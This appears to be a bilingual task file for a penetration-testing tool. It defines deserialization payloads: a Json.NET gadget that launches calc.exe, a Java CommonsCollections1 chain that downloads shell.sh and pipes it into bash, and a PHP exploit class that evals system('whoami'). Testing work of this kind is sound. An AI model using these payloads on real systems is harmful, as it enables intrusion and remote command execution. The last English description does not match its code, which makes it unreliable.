description.zh: 以 ObjectDataProvider gadget 配合 Json.Net 格式生成弹出 calc.exe 的 .NET 反序列化载荷，验证 Json.NET 反序列化点可触发执行。命中判据：目标主机出现计算器进程。
description.en: Generate a .NET deserialization payload that launches calc.exe with the ObjectDataProvider gadget in Json.Net format, verifying the Json.NET sink triggers execution. Success check: a calculator process appears on the target host.

description.zh: 判据: 以 CommonsCollections1 链生成下载脚本的序列化载荷（Runtime.exec 不经过 Shell，管道符无效；需组合命令时改用 bash -c {echo,<Base64>}|{base64,-d}|{bash,-i} 写法）。命中判据：攻击者 HTTP 日志收到目标对 /shell.sh 的请求，且目标侧 /tmp/shell.sh 落盘或出现命令执行痕迹。
description.en: Generate a CommonsCollections1 serialized payload that pipes a downloaded script into bash, verifying the Java deserialization sink reaches command execution. Success check: the attacker HTTP log records the target fetching shell.sh, or the target shows the corresponding command-execution trace.

patches.expectedCommand:
<?php
class Exploit {
public $cmd = "system('whoami');";
function __destruct() {
eval($this->cmd);
}
}
echo serialize(new Exploit());
?>

description.zh: 判据: 定义 __destruct 中 eval 执行命令的 Exploit 类并输出其序列化串，验证反序列化点还原对象后自动触发命令执行。命中判据：反序列化执行后返回 whoami 输出。
description.en: Define a two-level Chain-Action call chain fired from __destruct and print its serialization, verifying the deserialization sink executes system when the chain is restored.
